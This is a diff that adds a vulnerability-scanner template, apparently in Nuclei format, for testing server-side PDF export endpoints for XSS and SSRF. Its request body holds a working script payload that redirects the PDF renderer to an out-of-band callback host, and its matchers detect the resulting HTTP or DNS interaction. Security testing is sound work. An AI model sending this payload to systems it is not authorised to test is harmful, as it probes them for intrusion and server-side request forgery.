@@ -1,0 +1,28 @@
+id: whai-xss-pdf-export
+
+info:
+  name: XSS in PDF Export (Server-Side)
+  author: whitehat-ai
+  severity: high
+  description: Tests XSS in server-side PDF generation
+  tags: xss,pdf,ssrf,high
+  classification:
+    cwe-id: CWE-79
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/export"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"content":"<script>document.location=\"http://{{interactsh-url}}\"</script>"}'
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
